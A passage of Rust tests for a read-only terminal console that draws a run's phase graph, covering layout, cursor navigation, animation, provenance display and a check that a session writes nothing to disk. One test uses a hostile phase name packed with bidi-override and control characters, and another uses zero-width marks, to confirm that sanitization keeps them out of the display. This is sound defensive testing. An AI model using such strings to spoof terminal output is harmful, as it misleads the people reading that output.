    let head = plan(&phases, None, "running", Some("phase-0"), None, 40, 5);
    assert!(!head.left_elided && head.right_elided);
    let tail = plan(&phases, None, "running", Some("phase-7"), None, 40, 5);
    assert!(tail.left_elided && !tail.right_elided);
    let middle = plan(&phases, None, "running", Some("phase-4"), None, 26, 5);
    assert!(middle.left_elided && middle.right_elided);
    for (plan, cursor) in [(&head, "phase-0"), (&tail, "phase-7"), (&middle, "phase-4")] {
        assert!(
            plan.segments.iter().any(|seg| seg.key == cursor),
            "the window always contains {cursor}"
        );
        let text = text_of(&paint(plan, 0, false));
        assert_eq!(text.contains('‹'), plan.left_elided);
        assert_eq!(text.contains('›'), plan.right_elided);
    }

    // With no cursor the window falls back to the CURRENT phase, and
    // with neither to the head of the rail.
    assert_eq!(anchor_of(&phases, Some("phase-5")), 5);
    assert_eq!(anchor_of(&phases, None), 0, "the current phase");
    assert_eq!(
        anchor_of(&phases, Some("gone")),
        0,
        "a stale key anchors nothing"
    );
    let nothing: Vec<Phase> = vec![gphase("a", 1, false, Vec::new())];
    assert_eq!(anchor_of(&nothing, None), 0, "no cursor and no current");

    // THERE IS NO SCROLL OFFSET. The window is a function of the cursor
    // and the rect, so asking twice in any order answers the same.
    let again = plan(&phases, None, "running", Some("phase-7"), None, 40, 5);
    assert_eq!(tail, again, "derived every frame, never remembered");
    assert_ne!(tail, head);

    // A phase whose own columns run past the pane's edge says so with
    // the same mark rather than pretending the phase ended there.
    let long = vec![gphase(
        "long",
        1,
        true,
        (0..12)
            .map(|index| {
                gcolumn(
                    None,
                    vec![gnode(&format!("step{index}"), "x", "on-phosphor")],
                )
            })
            .collect(),
    )];
    let cut = plan_of(&long, None, "running", 40, 5);
    assert!(cut.right_elided, "the phase continues past the edge");
    assert!(cut.segments[0].x1 < cut.width - 1, "and nothing spills");
}

// ------------------------- AC-draw-1, AC-draw-2, AC-mode-1, AC-width-1

#[test]
fn the_graph_draws_the_consoles_grammar_in_every_mode_and_at_the_floor() {
    let views = graph_views(rail_phases(), "running");
    let tui = at_graph();

    // AC-width-1 at 80 columns: the full grammar, all of it.
    let frame = frame_of(&tui, &views, 80, 24);
    for element in ["──>", "┤", "├", "┌", "┐", "└", "┘"] {
        assert!(frame.contains(element), "{element} missing:\n{frame}");
    }
    // AC-draw-1: two lanes leave the rail, run parallel, and REJOIN it
    // before the next step's edge.
    let plan = plan_of(&rail_phases(), None, "running", 78, 5);
    let join = &plan.segments[1].joins[0];
    let lines: Vec<String> = text_of(&paint(&plan, 0, false))
        .lines()
        .map(str::to_string)
        .collect();
    let rail: Vec<char> = lines[plan.rail_row].chars().collect();
    assert_eq!(rail[join.x0], '┤', "the lanes leave the rail here");
    assert_eq!(rail[join.x1], '├', "and rejoin it here");
    assert!(
        rail[join.x1 + 1..].contains(&'>'),
        "the next step's edge comes AFTER the rejoin: {:?}",
        lines[plan.rail_row]
    );
    for row in &join.rows {
        let lane: Vec<char> = lines[*row].chars().collect();
        assert!(
            "┌└".contains(lane[join.x0]) && "┐┘".contains(lane[join.x1]),
            "a lane corners out of the rail and back into it"
        );
    }
    // AC-draw-2: a plain phase is one rail node; single-node columns are
    // arrowed rail steps.
    assert_eq!(plan.segments[0].marks.len(), 1, "a plain phase is one node");
    assert_eq!(plan.segments[0].marks[0].row, plan.rail_row);
    assert!(
        lines[plan.rail_row].contains("● only") || lines[plan.rail_row].contains("● review"),
        "a one-node step sits on the rail with its label: {:?}",
        lines[plan.rail_row]
    );

    // AC-mode-1: each mode renders, and each one that cannot draw lanes
    // still says `⑂n` rather than collapsing parallel into sequential.
    let rail_mode = plan_of(&rail_phases(), None, "running", 78, 3);
    assert_eq!(rail_mode.mode, Mode::Rail);
    let text = text_of(&paint(&rail_mode, 0, false));
    assert!(text.contains("⑂2"), "a collapsed fork still forks: {text}");
    assert!(text.contains("──>") && text.contains("design ×2"), "{text}");
    assert_eq!(paint(&rail_mode, 0, false).len(), 3);

    let squeezed = plan_of(&rail_phases(), None, "running", 78, 1);
    assert_eq!(squeezed.mode, Mode::Compressed);
    let text = text_of(&paint(&squeezed, 0, false));
    assert_eq!(
        paint(&squeezed, 0, false).len(),
        1,
        "one row, never a blank pane"
    );
    for element in ["intake", "design ×2", "⑂2", "verify", "──>"] {
        assert!(text.contains(element), "{element} missing from {text:?}");
    }

    // AC-width-1 at the floor: legible, uncorrupted, and still a graph.
    let narrow = buffer_of(&tui, &views, MIN_WIDTH, 24);
    let frame = narrow.join("\n");
    assert!(!frame.contains("too small"), "{frame}");
    assert!(
        frame.contains('┤') && frame.contains('├'),
        "the fork survives 60 columns:\n{frame}"
    );
    for row in narrow.iter().take(9) {
        let cells: Vec<char> = row.chars().collect();
        assert_eq!(cells.len(), usize::from(MIN_WIDTH));
        assert!(
            "│┌└".contains(cells[0]) && "│┐┘".contains(cells[cells.len() - 1]),
            "no frame is corrupted: {row:?}"
        );
    }
}

// ------------------------------------------------- AC-safe-1, AC-safe-2

#[test]
fn a_hostile_phase_name_renders_inert_and_does_not_move_its_neighbour() {
    let hostile = "de\u{202E}sign\u{200B}\x07\r";
    let phases = vec![
        gphase("intake", 1, false, Vec::new()),
        gphase(hostile, 1, true, Vec::new()),
        gphase("verify", 1, false, Vec::new()),
    ];
    let plan = plan_of(&phases, None, "running", 80, 7);
    assert_eq!(plan.segments[1].name, "design", "inert, in source order");
    assert_eq!(
        plan.segments[1].x1 - plan.segments[1].x0 + 1,
        6,
        "six columns, which is what the terminal will draw"
    );
    assert_eq!(
        plan.segments[2].x0,
        plan.segments[1].x1 + 1 + ARROW_WIDTH,
        "the following segment starts at its expected x"
    );
    let text = text_of(&paint(&plan, 0, false));
    for character in ['\u{202E}', '\u{200B}', '\x07', '\r'] {
        assert!(!text.contains(character), "{character:?} reached a cell");
    }

    // AC-safe-2: a CJK name is twelve columns wide, not six, and the
    // rail is laid out on that measurement.
    let phases = vec![
        gphase("設計フェーズ", 1, true, Vec::new()),
        gphase("verify", 1, false, Vec::new()),
    ];
    let plan = plan_of(&phases, None, "running", 80, 7);
    assert_eq!(plan.segments[0].x1 - plan.segments[0].x0 + 1, 12);
    assert_eq!(plan.segments[1].x0, plan.segments[0].x1 + 1 + ARROW_WIDTH);
    // Drawn: the neighbour lands where the plan says, in the buffer and
    // not only in the geometry. (`TestBackend` keeps a double-width
    // glyph's second column as its own cell, so the buffer text carries
    // a gap the terminal does not — the claim worth making is the x.)
    let views = graph_views(
        vec![
            gphase("設計フェーズ", 1, true, Vec::new()),
            gphase("verify", 1, false, Vec::new()),
        ],
        "running",
    );
    let lines = buffer_of(&at_graph(), &views, 80, 24);
    let drawn = plan_of(
        &[
            gphase("設計フェーズ", 1, true, Vec::new()),
            gphase("verify", 1, false, Vec::new()),
        ],
        None,
        "running",
        78,
        5,
    );
    let baseline = lines
        .iter()
        .position(|line| line.contains("verify"))
        .expect("the name baseline is drawn");
    assert!(
        at(&lines[baseline], drawn.segments[1].name_x + 1).starts_with("verify"),
        "the CJK name did not displace its neighbour: {:?}",
        lines[baseline]
    );
    assert!(lines[baseline].contains('設'), "{:?}", lines[baseline]);
}

// ------------------------------ AC-nav-1, AC-nav-2, AC-nav-3, AC-nav-5

#[test]
fn the_graph_cursor_walks_the_rail_with_the_arrows_and_the_lanes_with_up_down() {
    let views = views();
    let mut tui = at_run();
    assert!(in_graph(&tui));

    // The rail, both ways, wrapping at both ends — all through the same
    // `move_to` every other list already uses.
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"));
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("design"));
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"), "wraps at one end");
    apply(&mut tui, &views, Key::Left);
    assert_eq!(tui.cursor[0].as_deref(), Some("design"), "and at the other");

    // Into the lanes, in draw order, wrapping at both edges.
    let lanes = lane_keys(&tui, &views);
    assert!(lanes.len() > 1, "design has members: {lanes:?}");
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.node.as_deref(), Some(lanes[0].as_str()));
    apply(&mut tui, &views, Key::Up);
    assert_eq!(
        tui.node.as_deref(),
        lanes.last().map(String::as_str),
        "wraps at the top of a lane group"
    );
    apply(&mut tui, &views, Key::Down);
    assert_eq!(
        tui.node.as_deref(),
        Some(lanes[0].as_str()),
        "and at the foot"
    );

    // Moving the rail drops the lane the cursor was in.
    apply(&mut tui, &views, Key::Left);
    assert_eq!(tui.node, None);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"));

    // With no rail cursor at all there are no lanes to be in, and a
    // level with no run has none either.
    tui.cursor[0] = None;
    assert!(lane_keys(&tui, &views).is_empty());
    assert!(lane_keys(&at_run(), &Views::empty()).is_empty());

    // A PLAIN phase has no nodes, so `↑↓` there are inert by
    // construction rather than by a special case.
    let plain = graph_views(rail_phases(), "running");
    let mut tui = at_graph();
    apply(&mut tui, &plain, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"));
    assert!(
        lane_keys(&tui, &plain).is_empty(),
        "a plain phase has no lanes"
    );
    apply(&mut tui, &plain, Key::Down);
    assert_eq!(tui.node, None);
}

#[test]
fn enter_scopes_the_phase_whatever_the_lane_cursor_says() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    let lane = tui.node.clone();
    assert!(lane.is_some(), "the cursor walked into a lane");
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "design"),
        "Enter scopes the PHASE, not the lane: {}",
        status_line(&tui)
    );
    assert_eq!(tui.node, lane, "the lane cursor is display-only");
}

#[test]
fn a_graph_selection_survives_a_refresh_and_a_vanished_node_highlights_nothing() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    let lane = tui.node.clone();

    // A refresh with the same subjects keeps both selections.
    let fresh = views_with("intake");
    settle(&mut tui, &fresh);
    assert_eq!(tui.cursor[0].as_deref(), Some("design"));
    assert_eq!(tui.node, lane);

    // A lane key whose node went away highlights nothing and does not
    // panic — the absence of code, not a diff routine.
    tui.node = Some("a node that is no longer drawn".to_string());
    let view = fresh.run.as_ref().unwrap();
    let plan = plan(
        &view.phases,
        None,
        "running",
        tui.cursor[0].as_deref(),
        tui.node.as_deref(),
        100,
        7,
    );
    assert!(
        plan.segments
            .iter()
            .flat_map(|seg| &seg.marks)
            .all(|mark| !mark.selected),
        "a stale key matches no drawn node"
    );
    let _ = frame_of(&tui, &fresh, 100, 24);
    // And the next move lands on a real node again.
    apply(&mut tui, &fresh, Key::Up);
    assert_eq!(
        tui.node.as_deref(),
        Some(lane_keys(&tui, &fresh)[0].as_str())
    );

    // A phase that vanished takes the whole graph selection with it.
    let empty = Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(forge_view::run_view(&[], None)),
        transcript: None,
    };
    settle(&mut tui, &empty);
    assert!(selected(&tui, &empty).is_none());
    assert!(lane_keys(&tui, &empty).is_empty());
    let _ = frame_of(&tui, &empty, 100, 24);
    // A new run clears it outright, alongside every other selection.
    tui.node = Some("held".to_string());
    tui.assign_run("run-old".to_string());
    assert_eq!(tui.node, None);
}

#[test]
fn the_rail_arrows_are_a_named_no_op_in_every_other_pane() {
    let views = views();

    // At the fleet, where there is no rail at all.
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Down);
    let held = (tui.cursor[0].clone(), tui.pane, tui.level);
    apply(&mut tui, &views, Key::Left);
    apply(&mut tui, &views, Key::Right);
    assert_eq!((tui.cursor[0].clone(), tui.pane, tui.level), held);
    assert_eq!(tui.node, None);

    // At the seats and at the trail.
    for pane in [1usize, 2] {
        let mut tui = at_run();
        tui.pane = pane;
        tui.cursor[pane] = Some("held".to_string());
        apply(&mut tui, &views, Key::Left);
        apply(&mut tui, &views, Key::Right);
        assert_eq!(tui.cursor[pane].as_deref(), Some("held"));
        assert_eq!(tui.node, None);
    }

    // And at the PARTICIPANT level, whose panes are paragraphs.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    apply(&mut tui, &views, Key::Down);
    let offset = tui.offset;
    apply(&mut tui, &views, Key::Left);
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.offset, offset, "an arrow with no axis changes nothing");
}

// -------------------------------------------------------------- AC-nav-4

#[test]
fn the_selection_and_the_current_phase_differ_in_a_channel_that_is_not_colour() {
    let views = graph_views(rail_phases(), "running");
    let mut tui = at_graph();

    // The selected phase is NOT the current one: the name is REVERSED,
    // and the current phase's rail node is FILLED where a visited one's
    // is hollow. Two channels, neither of them colour.
    tui.cursor[0] = Some("intake".to_string());
    let (buffer, lines) = buffer_and_lines(&tui, &views, 100, 24);
    let baseline = baseline_of(&lines);
    assert!(
        modifier_at(&buffer, &lines, baseline, "intake").contains(Modifier::REVERSED),
        "the selection is REVERSED on the name"
    );
    assert!(
        !modifier_at(&buffer, &lines, baseline, "verify").contains(Modifier::REVERSED),
        "and the current phase is not the selection"
    );
    let frame = lines.join("\n");
    assert!(frame.contains('●'), "the current phase's node is filled");
    assert!(frame.contains('○'), "a visited one's is hollow");

    // And where the selected phase IS the current one, both marks are
    // present and still separable: REVERSED name, filled node.
    tui.cursor[0] = Some("verify".to_string());
    let (buffer, lines) = buffer_and_lines(&tui, &views, 100, 24);
    let baseline = baseline_of(&lines);
    assert!(
        modifier_at(&buffer, &lines, baseline, "verify").contains(Modifier::REVERSED),
        "the selection mark is still the selection mark"
    );
    assert!(
        !modifier_at(&buffer, &lines, baseline, "intake").contains(Modifier::REVERSED),
        "and it moved off the phase that no longer holds it"
    );
    let frame = lines.join("\n");
    assert!(frame.contains('●') && frame.contains('○'), "{frame}");

    // A lane node the cursor has walked into wears the SAME selection
    // mark on its own label — one idiom wherever the cursor is, and it
    // is still the modifier channel rather than the colour one.
    let phases = rail_phases();
    let member = phases[1].columns[0].nodes[1].key.clone();
    let walked = plan(
        &phases,
        None,
        "running",
        Some("design"),
        Some(&member),
        78,
        5,
    );
    let selected: Vec<&Mark> = walked
        .segments
        .iter()
        .flat_map(|seg| &seg.marks)
        .filter(|mark| mark.selected)
        .collect();
    assert_eq!(selected.len(), 1, "one node, and only one");
    assert_eq!(selected[0].label, "robustness");
    let row = selected[0].row;
    let painted = paint(&walked, 0, false);
    assert!(
        painted[row].spans.iter().any(|span| {
            span.content.contains("robustness")
                && span.style.add_modifier.contains(Modifier::REVERSED)
        }),
        "the lane label carries the selection: {:?}",
        painted[row]
    );

    // And so does a one-node step, whose label is the STEP's own name.
    let step = phases[1].columns[1].nodes[0].key.clone();
    let stepped = plan(&phases, None, "running", Some("design"), Some(&step), 78, 5);
    assert!(
        stepped.segments[1]
            .marks
            .iter()
            .any(|mark| mark.selected && mark.label == "review"),
        "a single-node column selects through its own node's key"
    );
}

fn buffer_and_lines(
    tui: &Tui,
    views: &Views,
    width: u16,
    height: u16,
) -> (ratatui::buffer::Buffer, Vec<String>) {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    terminal.draw(|frame| draw(frame, tui, views)).unwrap();
    let buffer = terminal.backend().buffer().clone();
    let mut lines = Vec::new();
    for row in 0..buffer.area.height {
        let mut line = String::new();
        for column in 0..buffer.area.width {
            line.push_str(buffer[(column, row)].symbol());
        }
        lines.push(line);
    }
    (buffer, lines)
}

/// The one row carrying every phase name: the shared baseline, found by
/// what it IS rather than by an arithmetic guess at where it sits.
fn baseline_of(lines: &[String]) -> usize {
    lines
        .iter()
        .position(|line| {
            line.contains("intake") && line.contains("design") && line.contains("verify")
        })
        .expect("one baseline carrying every name")
}

fn modifier_at(
    buffer: &ratatui::buffer::Buffer,
    lines: &[String],
    row: usize,
    needle: &str,
) -> Modifier {
    let byte = lines[row].find(needle).expect("the text is on that row");
    let column = lines[row][..byte].chars().count();
    buffer[(u16::try_from(column).unwrap(), u16::try_from(row).unwrap())].modifier
}

// -------------------------------------------------- AC-anim-2, AC-anim-4

#[test]
fn a_live_node_pulses_and_a_still_terminal_and_a_still_run_never_do() {
    let mut views = graph_views(rail_phases(), "running");
    let mut tui = at_graph();
    tui.animate = true;

    let sweep = |tui: &mut Tui, views: &Views| -> Vec<String> {
        (0..8)
            .map(|tick| {
                tui.ticks = tick;
                frame_of(tui, views, 100, 24)
            })
            .collect()
    };

    // A live run animates: the glyph moves, and nothing else does.
    let frames = sweep(&mut tui, &views);
    assert!(
        frames.iter().any(|frame| frame != &frames[0]),
        "an active node on a live run pulses"
    );
    // AC-anim-4: geometry does not vary with the tick — the skeleton is
    // byte-identical across the whole period, and `plan` takes no tick.
    let skeleton = |frame: &String| -> String {
        frame
            .chars()
            .map(|glyph| match "●◉○◎⊙⊗·".contains(glyph) {
                true => '@',
                false => glyph,
            })
            .collect()
    };
    for frame in &frames {
        assert_eq!(
            skeleton(frame),
            skeleton(&frames[0]),
            "only the glyph moves"
        );
    }

    // AC-anim-3: with animation off, every tick is the still frame —
    // set directly, with no environment touched.
    tui.animate = false;
    let stills = sweep(&mut tui, &views);
    assert!(
        stills.iter().all(|frame| frame == &stills[0]),
        "no animation, no motion"
    );
    assert_eq!(stills[0], frames[0], "and frame 0 IS the still frame");

    // AC-anim-2: a run that is not running is still at every tick, even
    // with animation on — the pulse gate is a model field.
    tui.animate = true;
    match views.run.as_mut().unwrap().summary.as_mut() {
        Some(summary) => summary.status = "completed".to_string(),
        None => panic!("the fixture folds"),
    }
    let concluded = sweep(&mut tui, &views);
    assert!(
        concluded.iter().all(|frame| frame == &concluded[0]),
        "nothing live, nothing moving"
    );
}

// -------------------------------------------- AC-15, AC-17: the boundaries

/// The file itself is the evidence: a renderer that cannot name a store
/// cannot write to one, and a widget layer with exactly two sanitized
/// constructors cannot be handed raw journal text.
const SOURCE: &str = include_str!("../tui.rs");

#[test]
fn the_tui_source_names_no_store_no_runtime_and_no_unsanitized_widget() {
    for forbidden in ["Store", "forge_runtime", "append_next", "create_run"] {
        assert!(
            !SOURCE.contains(forbidden),
            "tui.rs must not name {forbidden}: the console is read-only"
        );
    }
    // The TUI returns an ExitCode like every other arm: a
    // `process::exit` would run past the guard's Drop and leave the
    // operator's terminal in raw mode.
    assert!(!SOURCE.contains("process::exit"));
    // Exactly one constructor of each, and both take sanitized text.
    assert_eq!(SOURCE.matches("Cell::from(").count(), 1);
    assert_eq!(SOURCE.matches("Span::styled(").count(), 1);
    assert_eq!(SOURCE.matches("Span::raw(").count(), 0);
    assert_eq!(SOURCE.matches("Paragraph::new(\"").count(), 0);
    // The graph is a character grid, and the ruling against ratatui's
    // plotting surface is held here rather than remembered: its colour
    // is per cell, last writer wins, which would cost the per-node
    // colour vocabulary, and its text call would be a third path into a
    // buffer whose safety is ratatui's rather than `Safe`'s.
    for forbidden in ["canvas", "Canvas", "Braille", "Marker::"] {
        assert!(
            !SOURCE.contains(forbidden),
            "the graph draws box characters, never {forbidden}"
        );
    }
    // And no derivation: no status table, no cost or duration
    // arithmetic, no topology, no scope predicate of its own.
    for derived in [
        "fn status_code",
        "fn fmt_dur",
        "to_fixed_4",
        "fn age",
        "total_cost_usd",
    ] {
        assert!(
            !SOURCE.contains(derived),
            "tui.rs must not derive {derived}"
        );
    }
}

/// A directory tree as bytes: relative path, length, content. Comparing
/// this before and after is what "the operator's disk looks the same
/// afterwards" actually means — an NDJSON export alone passes cleanly
/// through a created database, a WAL and a migration.
fn tree(dir: &Path) -> Vec<(String, usize, Vec<u8>)> {
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir).unwrap().flatten() {
        let path = entry.path();
        let name = path.file_name().unwrap().to_string_lossy().to_string();
        if path.is_dir() {
            for (child, len, bytes) in tree(&path) {
                out.push((format!("{name}/{child}"), len, bytes));
            }
            continue;
        }
        let bytes = std::fs::read(&path).unwrap();
        out.push((name, bytes.len(), bytes));
    }
    out.sort();
    out
}

#[test]
fn a_whole_tui_session_writes_nothing_at_all() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let dir = tempfile::tempdir().unwrap();
    let db = dir.path().join("forge.db");
    {
        let mut store = Store::open(&db).unwrap();
        store
            .create_run(
                "run-proof",
                "a proof feature",
                "test",
                &json!({"files": {}}),
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::RunStarted,
                json!({"feature": "a proof feature", "manifest": {}}),
                None,
                None,
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::PhaseEntered,
                json!({"phase": "work"}),
                None,
                None,
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::EffectRequested,
                json!({"effect_id": "eff", "seat": "work", "phase": "work"}),
                None,
                None,
            )
            .unwrap();
    }
    let before_ndjson = Store::open(&db)
        .unwrap()
        .export_ndjson("run-proof")
        .unwrap();
    let before_tree = tree(dir.path());

    // Every navigation path, driven headlessly through the real
    // refresh source: descend, scope, descend again, filter, page,
    // help, refresh, ascend by both keys, and quit.
    script(&[
        Key::Down,
        Key::Enter,
        Key::Right,
        Key::Enter,
        Key::Up,
        Key::Left,
        Key::Escape,
        Key::Tab,
        Key::Down,
        Key::Enter,
        Key::Enter,
        Key::Down,
        Key::PageDown,
        Key::Tab,
        Key::Char('G'),
        Key::Backspace,
        Key::Char('/'),
        Key::Char('w'),
        Key::Enter,
        Key::Escape,
        Key::Char('r'),
        Key::Char('?'),
        Key::Escape,
        Key::Escape,
        Key::Quit,
    ]);
    let mut head = None;
    let mut source = |ask: Ask| crate::tui_views(&db, ask, &mut head, || NOW.to_string());
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 40).unwrap();
    assert_eq!(code, ExitCode::SUCCESS);

    assert_eq!(
        Store::open(&db)
            .unwrap()
            .export_ndjson("run-proof")
            .unwrap(),
        before_ndjson,
        "the journal is byte-identical"
    );
    assert_eq!(
        tree(dir.path()),
        before_tree,
        "and so is the whole directory"
    );
}

#[test]
fn enter_on_a_trail_row_opens_it_for_reading_and_esc_closes() {
    // Panes clamp to the frame, so a long row — a feature text, a park
    // reason, an error tail — was truncated with no way through. Enter
    // opens the whole row; the reader owns movement while it is open,
    // so scrolling a payload does not also move the list behind it.
    let views = views();
    let mut tui = at_run();
    tui.pane = 2;
    let seq = keys_for(&tui, &views)[0].clone();
    tui.cursor[2] = Some(seq.clone());
    assert!(tui.reading.is_none());

    apply(&mut tui, &views, Key::Enter);
    let text = tui.reading.clone().expect("Enter opens the reader");
    assert!(text.contains(&format!("seq {seq}")), "{text}");
    assert!(text.contains("payload"), "{text}");
    assert!(footer_for(&tui).contains("Esc or Enter close"));

    // Both quit spellings remain terminal while the reader owns input.
    assert_eq!(apply(&mut tui, &views, Key::Quit), Flow::Quit);
    assert_eq!(apply(&mut tui, &views, Key::Char('q')), Flow::Quit);

    // Movement scrolls the reader, and the list cursor stays put.
    let before = tui.cursor[2].clone();
    apply(&mut tui, &views, Key::Up);
    apply(&mut tui, &views, Key::Char('k'));
    assert_eq!(tui.read_offset, 0, "up saturates at the first line");
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::PageDown);
    assert_eq!(tui.read_offset, 11);
    assert_eq!(tui.cursor[2], before, "the list must not move underneath");
    apply(&mut tui, &views, Key::PageUp);
    assert_eq!(tui.read_offset, 1);
    apply(&mut tui, &views, Key::Char('x'));
    assert_eq!(tui.read_offset, 1, "unbound keys leave the reader in place");
    apply(&mut tui, &views, Key::Char('g'));
    assert_eq!(tui.read_offset, 0);

    // The full text reaches the frame, wrapped rather than clipped.
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("row · Esc closes"), "{frame}");

    apply(&mut tui, &views, Key::Escape);
    assert!(tui.reading.is_none(), "Esc closes the reader");
    assert_eq!(tui.read_offset, 0);
    // Esc closed the reader only — it did not also pop the level.
    assert_eq!(tui.level, Level::Run);

    // The bottom-level participant view remains a paragraph: Enter is
    // deliberately inert there and cannot reopen a stale trail reader.
    let mut participant = at_seats("eff-i");
    apply(&mut participant, &views, Key::Enter);
    apply(&mut participant, &views, Key::Enter);
    assert_eq!(participant.level, Level::Participant);
    apply(&mut participant, &views, Key::Enter);
    assert!(participant.reading.is_none());
}

// ------------------------------------- AC-8/AC-17: provenance in the tui

/// The same journal, with the intake seat agent-resolved and fallen back
/// to its second model — plus the compile-time notice the manifest
/// already carries.
fn adopting_views() -> Views {
    let mut events = journal("intake");
    events[0].payload = json!({
        "feature": "one derivation, three surfaces",
        "manifest": {"agents": {"intake": {"notices": [
            {"message": "optional capability gap: no MCP server github"},
        ]}}},
    });
    events[3].payload = json!({
        "effect_id": "eff-i", "attempt_id": "att1",
        "provenance": [{"member": null, "agent": "intake", "model": "opus",
                        "provider": "claude", "chain_index": 1}],
    });
    Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(forge_view::run_view(&events, Some(&state()))),
        transcript: None,
    }
}

/// The run level shows both run-level notices and the per-seat sentence,
/// and it shows the sentence the derivation composed rather than one of
/// its own.
#[test]
fn the_run_level_shows_run_notices_and_per_seat_provenance() {
    let adopting = adopting_views();
    let frame = frame_of(&at_run(), &adopting, 120, 40);
    assert!(frame.contains("note  capability-gap"), "{frame}");
    assert!(frame.contains("note  fallback"), "{frame}");
    assert!(frame.contains("intake · opus via claude"), "{frame}");

    // A run that resolves nothing shows neither, so an inline fleet
    // reads exactly as it did before decision 0016.
    let inline = views();
    let frame = frame_of(&at_run(), &inline, 120, 40);
    assert!(!frame.contains("note  "), "{frame}");
    assert!(!frame.contains(" via "), "{frame}");
}

/// The seat level answers "what served this seat" beside "how do I
/// resume it", and marks absence rather than guessing.
#[test]
fn the_seat_level_names_what_served_the_seat() {
    let adopting = adopting_views();
    let seats = frame_of(&at_seats("eff-i"), &adopting, 120, 40);
    assert!(seats.contains("intake · opus via claude"), "{seats}");

    // Two rungs: the first scopes the seat, the second descends into it.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &adopting, Key::Enter);
    apply(&mut tui, &adopting, Key::Enter);
    let detail = frame_of(&tui, &adopting, 120, 40);
    assert!(detail.contains("served by"), "{detail}");
    assert!(detail.contains("intake · opus via claude"), "{detail}");

    let inline = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &inline, Key::Enter);
    apply(&mut tui, &inline, Key::Enter);
    let detail = frame_of(&tui, &inline, 120, 40);
    assert!(detail.contains("served by"), "{detail}");
    assert!(detail.contains(forge_view::ABSENT), "{detail}");
}

#[test]
fn zero_width_characters_cannot_overwrite_the_rail() {
    // The panel's residual: combining marks and variation selectors are
    // neither control characters nor bidi marks, so they survive Safe;
    // unicode-width reports 0 for them while the buffer still spends a
    // cell each. A label of N such marks planned one column and
    // overwrote N — erasing the rail, the arrows and a neighbour's
    // state glyph. clamp now bounds on BOTH display width and char
    // count, which holds for every zero-width class rather than an
    // enumerated few.
    let marks = "\u{0301}".repeat(40);
    let clamped = clamp(&marks, 8);
    assert!(
        clamped.chars().count() <= 8,
        "a zero-width label must never spend more cells than its column: {} chars",
        clamped.chars().count()
    );
    let selectors = "\u{FE0F}".repeat(40);
    assert!(clamp(&selectors, 6).chars().count() <= 6);
    // Ordinary text is untouched by the second bound.
    assert_eq!(clamp("intake", 10), "intake");
    assert_eq!(clamp("", 4), "");
}

#[test]
fn an_unlabelled_fork_carries_the_rail_through_its_capsule() {
    // A panel with no step name left its capsule's middle row blank, so
    // the rail stopped for the width of the widest member label and
    // read as broken track rather than as parallelism. A LABELLED fork
    // still parts the rail to make room for its name.
    let mut cells: Cells = vec![vec![Some((" ".to_string(), plain())); 24]; 3];
    let join = Join {
        x0: 2,
        x1: 10,
        rows: vec![0, 2],
        on_rail: false,
        label: None,
    };
    fork(&mut cells, &join, 1);
    let rail: String = cells[1]
        .iter()
        .flatten()
        .map(|(glyph, _)| glyph.as_str())
        .collect();
    // Byte slicing would land inside a box-drawing glyph; count chars.
    let interior: String = rail.chars().skip(3).take(7).collect();
    assert!(
        !interior.contains(' '),
        "the rail must not break across an unlabelled fork: {rail:?}"
    );

    let mut cells: Cells = vec![vec![Some((" ".to_string(), plain())); 24]; 3];
    let named = Join {
        label: Some("positions".to_string()),
        ..join
    };
    fork(&mut cells, &named, 1);
    let rail: String = cells[1]
        .iter()
        .flatten()
        .map(|(glyph, _)| glyph.as_str())
        .collect();
    assert!(
        rail.contains("positions"),
        "a named fork keeps its name: {rail:?}"
    );
}

#[test]
fn the_rail_cursor_starts_on_the_current_phase_and_moving_it_scopes() {
    // Two defects the operator hit together: a graph that opened with
    // nothing selected made `Enter` look like a dead key, and moving
    // the rail cursor left the panes below unscoped — where the console
    // scopes on a click.
    let views = views();
    let mut tui = Tui::new(Some("run-7".to_string()));
    assert!(tui.cursor[0].is_none());
    settle(&mut tui, &views);
    let seeded = tui.cursor[0].clone().expect("the rail cursor is seeded");
    let current = views
        .run
        .as_ref()
        .unwrap()
        .phases
        .iter()
        .find(|phase| phase.current)
        .map(|phase| phase.name.clone());
    assert_eq!(Some(seeded), current, "seeded on the run's current phase");

    // Moving along the rail scopes to whatever it lands on.
    apply(&mut tui, &views, Key::Char('j'));
    let landed = tui.cursor[0].clone().unwrap();
    let scoped = match &tui.scope {
        Some(render::Scope::Phase(name)) => Some(name.clone()),
        _ => None,
    };
    assert_eq!(
        scoped,
        Some(landed),
        "moving the rail cursor scopes the panes"
    );

    // Seeding never overrides a selection the operator already made.
    let chosen = tui.cursor[0].clone();
